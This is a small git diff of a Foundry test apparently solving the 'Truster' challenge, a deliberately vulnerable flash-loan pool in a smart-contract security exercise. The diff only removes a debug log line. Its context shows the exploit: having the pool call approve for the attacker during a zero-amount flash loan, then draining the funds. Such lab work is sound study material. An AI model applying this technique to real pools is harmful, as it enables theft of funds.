@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.8.10;
 
-import {console} from "forge-std/console.sol";
 import {stdError} from "forge-std/stdlib.sol";
 
 import {Utilities} from "../utils/Utilities.sol";
@@ -60,8 +59,6 @@ contract TrusterTest is BaseTest {
         // make the pool approve the attacker to manage the whole pool balance while taking a free loan
         bytes memory attackCallData = abi.encodeWithSignature("approve(address,uint256)", attacker, poolBalance);
         pool.flashLoan(0, attacker, address(token), attackCallData);
-
-        console.log('allowance -> ', token.allowance(address(pool), attacker));
 
         // now steal all the funds
         vm.prank(attacker);
